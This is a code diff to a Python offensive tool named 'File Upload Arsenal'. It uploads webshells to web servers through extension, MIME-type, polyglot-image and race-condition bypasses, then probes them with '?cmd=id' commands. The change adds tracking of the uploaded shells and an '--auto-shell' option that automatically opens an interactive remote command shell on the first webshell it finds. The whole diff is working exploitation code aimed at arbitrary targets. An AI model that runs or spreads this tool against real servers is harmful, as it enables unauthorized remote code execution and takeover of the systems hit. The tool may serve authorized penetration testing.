@@ -9,6 +9,7 @@ Features:
 - Class-based design for reuse in CI/CD or internal tooling.
 - Structured findings with severity and description.
 - Optional interactive ?cmd= webshell client.
+- Auto-shell: track uploaded shells and open interactive shell automatically.
 """
 
 import argparse
@@ -37,7 +38,7 @@ def banner():
      \ V / / /|      / /   / __ \/ _ \/ ___/ //_/
       \ / / / |     / /___/ / / /  __/ /__/ ,<   
        \_/_/_/|_|____\____/_/ /_/\___/\___/_/|_|  
-                /_____/ File Upload Arsenal v3.2
+                /_____/ File Upload Arsenal v3.3
     {W}""")
 
 
@@ -114,6 +115,7 @@ class FileUploadTester:
         self.verbose = verbose
         self.session = requests.Session()
         self.vulnerabilities: list[dict] = []
+        self.shells: list[dict] = []  # track crafted/uploaded shells
 
     # --- logging helpers ---
 
@@ -214,6 +216,8 @@ class FileUploadTester:
                 )
                 url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
                 if url:
+                    shell_info = {"filename": fname, "url": url}
+                    self.shells.append(shell_info)
                     self.success(
                         f"Potential webshell reachable at {url}?cmd=id",
                         severity="Critical",
@@ -252,6 +256,8 @@ class FileUploadTester:
                 )
                 url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
                 if url:
+                    shell_info = {"filename": fname, "url": url}
+                    self.shells.append(shell_info)
                     self.success(
                         f"Potential webshell via MIME bypass at {url}?cmd=id",
                         severity="Critical",
@@ -299,6 +305,8 @@ class FileUploadTester:
                     if fname in ("jpegphp.jpg", "pngphp.png", "gifphp.gif"):
                         url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
                         if url:
+                            shell_info = {"filename": fname, "url": url}
+                            self.shells.append(shell_info)
                             self.success(
                                 f"Polyglot webshell reachable at {url}?cmd=id",
                                 severity="Critical",
@@ -356,6 +364,7 @@ class FileUploadTester:
                         severity="High",
                         vuln_type="RaceCondition"
                     )
+                    self.shells.append({"filename": filename, "url": access_url})
                     print(f"{G}[+] Try: {access_url}?cmd=id{W}")
                     print(f"{G}[+] Try: {access_url}?cmd=ls+-la{W}")
                     return True
@@ -414,7 +423,6 @@ class FileUploadTester:
                 params = {"cmd": cmd}
                 r = self.session.get(shell_url, params=params, timeout=10)
                 print(f"{Y}--- response [{r.status_code}] ---{W}")
-                # print raw text; you can refine later
                 print(r.text.strip())
                 print(f"{Y}--------------------------{W}")
             except Exception as e:
@@ -511,6 +519,10 @@ def parse_args(argv=None):
         help="Existing webshell URL (e.g. https://target/uploads/shell.php) for interactive ?cmd= shell"
     )
     parser.add_argument(
+        "--auto-shell", action="store_true",
+        help="If set, automatically open interactive shell using the first discovered uploaded shell"
+    )
+    parser.add_argument(
         "-v", "--verbose", action="store_true",
         help="Verbose logging"
     )
@@ -543,10 +555,15 @@ def main(argv=None):
             f.write(report)
         print(f"\n{G}[+] Report saved to {args.output}{W}")
 
-    # If user supplied a shell URL, drop into interactive mode
+    # Shell usage: explicit URL wins, then auto-shell on first discovered uploaded shell
     if args.shell_url:
         print()
         tester.interactive_shell(args.shell_url)
+    elif args.auto_shell and tester.shells:
+        first_shell = tester.shells[0]
+        shell_url = first_shell["url"]
+        print(f"\n{G}[+] Auto-shell: using uploaded shell at {shell_url}{W}")
+        tester.interactive_shell(shell_url)
 
 
 if __name__ == "__main__":
